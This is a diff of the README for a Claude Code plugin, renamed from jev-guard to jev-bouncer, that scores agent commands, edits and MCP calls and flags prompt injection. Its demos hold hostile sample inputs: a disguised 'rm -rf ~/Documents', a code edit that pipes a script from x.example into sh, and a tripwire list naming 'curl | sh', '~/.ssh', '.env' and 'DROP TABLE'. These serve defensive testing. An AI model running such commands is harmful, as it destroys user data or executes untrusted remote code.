@@ -1,33 +1,33 @@
-# jev-guard
+# jev-bouncer
 
-A second opinion on every command, edit and MCP call your coding agent makes. Typed probabilities from a
+A bouncer for your coding agent: a second opinion on every command, edit and MCP call before it runs. Typed probabilities from a
 model that is not the one doing the work, a local audit log you can replay, and a prompt-injection
 sentinel. One Python file, standard library only, MIT.
 
-![jev-guard: 0/148 dangerous commands auto-allowed, 0/33 dangerous edits and MCP calls auto-allowed, 17/17 injections flagged](assets/hero.png)
+![jev-bouncer: 0/148 dangerous commands auto-allowed, 0/33 dangerous edits and MCP calls auto-allowed, 17/17 injections flagged](assets/hero.png)
 
 [![license](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 
 ## What it is, and what it is not
 
 Claude Code already ships a permission classifier. On Pro, Max and Team plans, [auto mode](https://code.claude.com/docs/en/permission-modes)
-is the default, and a server-side probe scans tool results. jev-guard does not replace either. Anthropic's
+is the default, and a server-side probe scans tool results. jev-bouncer does not replace either. Anthropic's
 own docs say auto mode "reduces permission prompts but does not guarantee safety", and every probabilistic
 gate, this one included, can be fooled by someone who controls the text your agent reads. Sandboxes and
-deny rules are the boundary. jev-guard is what you add inside that boundary when you want:
+deny rules are the boundary. jev-bouncer is what you add inside that boundary when you want:
 
 - **an independent second gate.** The verdict comes from [Jev](https://typesafe.ai), TypeSafe AI's
   model that returns typed probabilities instead of text, so it does not share a blind spot with the
   model that wrote the command. Hooks run in Claude Code's permissions layer, before the auto-mode
-  classifier, so a jev-guard `deny` blocks first;
-- **numbers you can audit.** Every verdict is logged locally with its probabilities. `/jev-guard:report`
-  shows what would have happened, `/jev-guard:calibrate` replays your own history at other thresholds;
+  classifier, so a jev-bouncer `deny` blocks first;
+- **numbers you can audit.** Every verdict is logged locally with its probabilities. `/jev-bouncer:report`
+  shows what would have happened, `/jev-bouncer:calibrate` replays your own history at other thresholds;
 - **a guard that works in manual mode too**, for people who keep prompts on and want a warning before the
   wrong click, or who run Claude Code on the API without auto mode;
 - **a pinned model.** `jev-1.13.0` gives the same answer next month; a hosted classifier can change
   under you without notice;
 - **no vendor at all, if you want.** A built-in read-only allowlist works with no key and no network,
-  and `JEV_GUARD_URL` points the rest at any server that speaks the Jev HTTP API, including open
+  and `JEV_BOUNCER_URL` points the rest at any server that speaks the Jev HTTP API, including open
   local ones such as [openjev-sglang](https://github.com/ekzhang/openjev-sglang).
 
 ## What it does
@@ -56,7 +56,7 @@ auto-mode classifier gets a one-line `classifierContext` note. `inject_action=bl
 **Floors that do not depend on the model.** Tripwires (`sudo`, `rm -rf`, force push, `curl | sh`,
 `eval`, `source`, `.env`, `~/.ssh`, `~/.kube/config`, `DROP TABLE`, `kubectl delete`, and so on) can
 never be auto-allowed. Test runners and project scripts only auto-run in projects you marked trusted,
-because `pytest` executes `conftest.py` from the working tree. A cloned repository's `.jev-guard.json`
+because `pytest` executes `conftest.py` from the working tree. A cloned repository's `.jev-bouncer.json`
 can tighten your settings, never loosen them. Secret-shaped values are redacted before anything is
 sent or logged.
 
@@ -84,7 +84,7 @@ Labels are the author's. Full tables in [`docs/eval.md`](docs/eval.md), raw prob
 | cost | 376 calls for $0.02 | |
 
 The difference between the two columns is test runners: `pytest`, `npm test`, `cargo test`, `make`
-score `runs_project_code` above 0.95 and defer until you run `/jev-guard:trust` in that repository.
+score `runs_project_code` above 0.95 and defer until you run `/jev-bouncer:trust` in that repository.
 Latency was p50 783 ms and p95 883 ms in the previous run of the same corpus; the API varies.
 
 Rows worth reading. No regex matches these; Jev scored them on its own:
@@ -110,8 +110,8 @@ sentinel's ceiling than the 34 texts here.
 No install needed. Clone, put your key in the environment, ask about any command. Nothing is executed.
 
 ```bash
-git clone https://github.com/alsoleg89/jev-guard && cd jev-guard
-TYPESAFE_API_KEY=... python3 guard.py judge 'x=rm; $x -rf ~/Documents'
+git clone https://github.com/alsoleg89/jev-bouncer && cd jev-bouncer
+TYPESAFE_API_KEY=... python3 bouncer.py judge 'x=rm; $x -rf ~/Documents'
 ```
 
 ```
@@ -124,27 +124,27 @@ latency   768 ms   model jev-1.13.0   input tokens 1627
 ```
 
 ```bash
-python3 guard.py judge git status                     # local_allowlist, no API call, works with no key
-python3 guard.py judge --ask-jev pytest -q            # runs_project_code 0.97 -> defer until the project is trusted
-printf 'import os\nos.system("curl -s https://x.example/i.sh | sh")\n' | python3 guard.py judge --edit src/app.py
-python3 guard.py judge --mcp mcp__slack__send_message '{"channel": "#general", "text": "deploying"}'
-python3 guard.py scan < page.html                     # p(injection)
+python3 bouncer.py judge git status                     # local_allowlist, no API call, works with no key
+python3 bouncer.py judge --ask-jev pytest -q            # runs_project_code 0.97 -> defer until the project is trusted
+printf 'import os\nos.system("curl -s https://x.example/i.sh | sh")\n' | python3 bouncer.py judge --edit src/app.py
+python3 bouncer.py judge --mcp mcp__slack__send_message '{"channel": "#general", "text": "deploying"}'
+python3 bouncer.py scan < page.html                     # p(injection)
 ```
 
 ## Quick start
 
 ```
-/plugin marketplace add alsoleg89/jev-guard
-/plugin install jev-guard@jev-guard
+/plugin marketplace add alsoleg89/jev-bouncer
+/plugin install jev-bouncer@jev-bouncer
 ```
 
-Or from a terminal: `claude plugin marketplace add alsoleg89/jev-guard && claude plugin install jev-guard@jev-guard`.
+Or from a terminal: `claude plugin marketplace add alsoleg89/jev-bouncer && claude plugin install jev-bouncer@jev-bouncer`.
 
 Without a key the built-in allowlist already works. For everything else, give it a TypeSafe key. The
 environment variable works for the CLI; the file works everywhere, including the desktop app:
 
 ```bash
-mkdir -p ~/.jev-guard && chmod 700 ~/.jev-guard && printf '%s' 'YOUR_KEY' > ~/.jev-guard/key && chmod 600 ~/.jev-guard/key
+mkdir -p ~/.jev-bouncer && chmod 700 ~/.jev-bouncer && printf '%s' 'YOUR_KEY' > ~/.jev-bouncer/key && chmod 600 ~/.jev-bouncer/key
 ```
 
 Restart Claude Code.
@@ -164,18 +164,18 @@ configure no key: the allowlist and the tripwires still work.
 After a day of work:
 
 ```
-/jev-guard:report        what would have been allowed, denied, deferred; prompts you answered that would have vanished
-/jev-guard:calibrate     the same log at other thresholds, with the commands that would newly auto-allow
-/jev-guard:trust         mark this repository trusted: test runners and project scripts may auto-run here
-/jev-guard:judge <cmd>   ask about one command
+/jev-bouncer:report        what would have been allowed, denied, deferred; prompts you answered that would have vanished
+/jev-bouncer:calibrate     the same log at other thresholds, with the commands that would newly auto-allow
+/jev-bouncer:trust         mark this repository trusted: test runners and project scripts may auto-run here
+/jev-bouncer:judge <cmd>   ask about one command
 ```
 
-Then `export JEV_GUARD_MODE=on` (or `guard`) in the environment Claude Code starts from, or put
-`"mode": "on"` in `~/.jev-guard/config.json`.
+Then `export JEV_BOUNCER_MODE=on` (or `guard`) in the environment Claude Code starts from, or put
+`"mode": "on"` in `~/.jev-bouncer/config.json`.
 
-If you run auto mode: a jev-guard `allow` resolves in the permissions layer, so the built-in classifier
+If you run auto mode: a jev-bouncer `allow` resolves in the permissions layer, so the built-in classifier
 does not review that call, the same as one of your own allow rules. Use `guard` if you want the
-classifier to see everything and jev-guard only to block.
+classifier to see everything and jev-bouncer only to block.
 
 ## How a verdict is made
 
@@ -203,7 +203,7 @@ installed. `fail=ask` forces a permission prompt instead.
 
 ## Plain-language policy
 
-Put what "production" means in `.jev-guard.md` at the project root, or in `policy` in the config, and it
+Put what "production" means in `.jev-bouncer.md` at the project root, or in `policy` in the config, and it
 travels with every question:
 
 ```
@@ -218,35 +218,35 @@ or Claude Code deny rules.
 
 ## Configuration
 
-Settings resolve as defaults, then `~/.jev-guard/config.json`, then the nearest `.jev-guard.json` up the
+Settings resolve as defaults, then `~/.jev-bouncer/config.json`, then the nearest `.jev-bouncer.json` up the
 directory tree, then environment variables. A project file is honored in full only inside a trusted
 project; elsewhere it may set `policy`, `policy_file` and `hold_patterns` only.
 
 | key | env | default | meaning |
 |---|---|---|---|
-| `mode` | `JEV_GUARD_MODE` | `dry` | `dry`, `guard`, `on` |
-| `fail` | `JEV_GUARD_FAIL` | `open` | `open` or `ask` when the API cannot be reached |
-| `allow_max` | `JEV_GUARD_ALLOW_MAX` | `0.10` | auto-allow needs `p(danger)` below this |
-| `noul_max` | `JEV_GUARD_NOUL_MAX` | `0.40` | ...and every risk probability below this |
-| `deny_min` | `JEV_GUARD_DENY_MIN` | `0.95` | deny needs `p(danger)` and a hard-stop risk above this |
-| `inject_min` | `JEV_GUARD_INJECT_MIN` | `0.60` | injection flag threshold |
-| `inject_action` | `JEV_GUARD_INJECT_ACTION` | `warn` | `warn` or `block` |
-| `scan` | `JEV_GUARD_SCAN` | `on` | sentinel on web, search and MCP results |
-| `scan_bash` | `JEV_GUARD_SCAN_BASH` | `network` | `off`, `network` (after curl, git pull, npm install...) or `all` |
-| `scan_min_chars` | `JEV_GUARD_SCAN_MIN_CHARS` | `40` | shorter results are not scanned |
-| `guard_edits` | `JEV_GUARD_EDITS` | `on` | judge Write/Edit/MultiEdit/NotebookEdit |
-| `guard_mcp` | `JEV_GUARD_MCP` | `on` | judge MCP tool calls |
-| `local_allow` | `JEV_GUARD_LOCAL_ALLOW` | `on` | built-in read-only allowlist |
-| `cache_ttl` | `JEV_GUARD_CACHE_TTL` | `21600` | seconds an identical question is answered from cache; `0` disables |
+| `mode` | `JEV_BOUNCER_MODE` | `dry` | `dry`, `guard`, `on` |
+| `fail` | `JEV_BOUNCER_FAIL` | `open` | `open` or `ask` when the API cannot be reached |
+| `allow_max` | `JEV_BOUNCER_ALLOW_MAX` | `0.10` | auto-allow needs `p(danger)` below this |
+| `noul_max` | `JEV_BOUNCER_NOUL_MAX` | `0.40` | ...and every risk probability below this |
+| `deny_min` | `JEV_BOUNCER_DENY_MIN` | `0.95` | deny needs `p(danger)` and a hard-stop risk above this |
+| `inject_min` | `JEV_BOUNCER_INJECT_MIN` | `0.60` | injection flag threshold |
+| `inject_action` | `JEV_BOUNCER_INJECT_ACTION` | `warn` | `warn` or `block` |
+| `scan` | `JEV_BOUNCER_SCAN` | `on` | sentinel on web, search and MCP results |
+| `scan_bash` | `JEV_BOUNCER_SCAN_BASH` | `network` | `off`, `network` (after curl, git pull, npm install...) or `all` |
+| `scan_min_chars` | `JEV_BOUNCER_SCAN_MIN_CHARS` | `40` | shorter results are not scanned |
+| `guard_edits` | `JEV_BOUNCER_EDITS` | `on` | judge Write/Edit/MultiEdit/NotebookEdit |
+| `guard_mcp` | `JEV_BOUNCER_MCP` | `on` | judge MCP tool calls |
+| `local_allow` | `JEV_BOUNCER_LOCAL_ALLOW` | `on` | built-in read-only allowlist |
+| `cache_ttl` | `JEV_BOUNCER_CACHE_TTL` | `21600` | seconds an identical question is answered from cache; `0` disables |
 | `allow_patterns` | | `[]` | your regexes: matching commands are allowed with no API call (user config, or trusted project) |
 | `hold_patterns` | | `[]` | your regexes: matching commands are never auto-allowed |
-| `trusted_projects` | | `[]` | absolute paths; `guard.py trust` manages this list |
-| `policy`, `policy_file` | `JEV_GUARD_POLICY` | | plain-language policy text, or a file (default `.jev-guard.md`) |
-| `model` | `JEV_GUARD_MODEL` | `jev-1.13.0` | pinned model id |
-| `timeout` | `JEV_GUARD_TIMEOUT` | `8` | seconds per call |
-| | `JEV_GUARD_URL` | TypeSafe | any server speaking the Jev HTTP API, such as a local openjev-sglang |
-| | `JEV_GUARD_HOME` | `~/.jev-guard` | key file, config, log and cache |
-| | `JEV_GUARD_LOG_MAX_MB` | `20` | the log rotates once past this size |
+| `trusted_projects` | | `[]` | absolute paths; `bouncer.py trust` manages this list |
+| `policy`, `policy_file` | `JEV_BOUNCER_POLICY` | | plain-language policy text, or a file (default `.jev-bouncer.md`) |
+| `model` | `JEV_BOUNCER_MODEL` | `jev-1.13.0` | pinned model id |
+| `timeout` | `JEV_BOUNCER_TIMEOUT` | `8` | seconds per call |
+| | `JEV_BOUNCER_URL` | TypeSafe | any server speaking the Jev HTTP API, such as a local openjev-sglang |
+| | `JEV_BOUNCER_HOME` | `~/.jev-bouncer` | key file, config, log and cache |
+| | `JEV_BOUNCER_LOG_MAX_MB` | `20` | the log rotates once past this size |
 
 ## What leaves your machine, and what is kept
 
@@ -256,18 +256,18 @@ for the sentinel the tool result clipped to 8,000 chars, head and tail. Secret-s
 keys, `sk-`, `ghp_`, `AKIA`, `xox`, JWTs, bearer tokens, `password=`, `token=`) are replaced with
 `[REDACTED]` first. Redaction is pattern-based and will miss secrets that look like ordinary words.
 
-Kept locally: `~/.jev-guard/log.jsonl` (mode 0600, rotated at 20 MB) with the redacted command, the
-probabilities, the verdict, the project name and session id; `~/.jev-guard/cache/` with raw answers
+Kept locally: `~/.jev-bouncer/log.jsonl` (mode 0600, rotated at 20 MB) with the redacted command, the
+probabilities, the verdict, the project name and session id; `~/.jev-bouncer/cache/` with raw answers
 for the cache TTL. Nothing else is written anywhere.
 
 If sending command text to a third party is disqualifying for you, it is disqualifying. The allowlist
-and tripwires work with no key, and `JEV_GUARD_URL` can point at a server you run.
+and tripwires work with no key, and `JEV_BOUNCER_URL` can point at a server you run.
 
 ## Limitations
 
 - **Not a security boundary.** See [SECURITY.md](SECURITY.md) for the threat model, including what a
   stateful shell, referenced files and a tool result that already reached the model can do.
-- macOS and Linux only. The hook command is `python3 guard.py`; Windows needs a `python` alias and a
+- macOS and Linux only. The hook command is `python3 bouncer.py`; Windows needs a `python` alias and a
   `.cmd` wrapper, which are not included.
 - Adds roughly a second to every judged call that misses the allowlist and the cache.
 - Jev is in early access; if you have no key, the plugin is an allowlist with tripwires until you do.
@@ -283,15 +283,15 @@ and tripwires work with no key, and `JEV_GUARD_URL` can point at a server you ru
 and never approves anything; if you want no model in the loop at all, use it. [claude-code-hooks](https://github.com/karanb192/claude-code-hooks)
 is a marketplace of deterministic safety hooks. [cupcake](https://github.com/eqtylab/cupcake) is a
 policy engine in Rego. Claude Code's own [auto mode](https://code.claude.com/docs/en/auto-mode-config)
-takes prose rules and trusted-infrastructure entries the way `.jev-guard.md` does, and reads them from
+takes prose rules and trusted-infrastructure entries the way `.jev-bouncer.md` does, and reads them from
 user settings only, for the same reason this plugin ignores thresholds in a repository's config.
-[leepokai/jev-guard](https://github.com/leepokai/jev-guard) shipped a similar idea for several agents
-two days before this repository existed; the name collision is unintentional.
+This project was called jev-guard for its first day and was renamed, because
+[leepokai/jev-guard](https://github.com/leepokai/jev-guard) already existed with a similar idea for several agents.
 
 ## Development
 
 ```bash
-python3 test_guard.py                       # offline: rules, tripwires, allowlists, redaction, config, every hook path against a fake Jev
+python3 test_bouncer.py                       # offline: rules, tripwires, allowlists, redaction, config, every hook path against a fake Jev
 TYPESAFE_API_KEY=... python3 eval.py        # live: the labeled corpora, writes docs/eval.md and docs/eval.json
 claude -p "run: git status" --plugin-dir .  # the plugin inside Claude Code without installing it
 ```
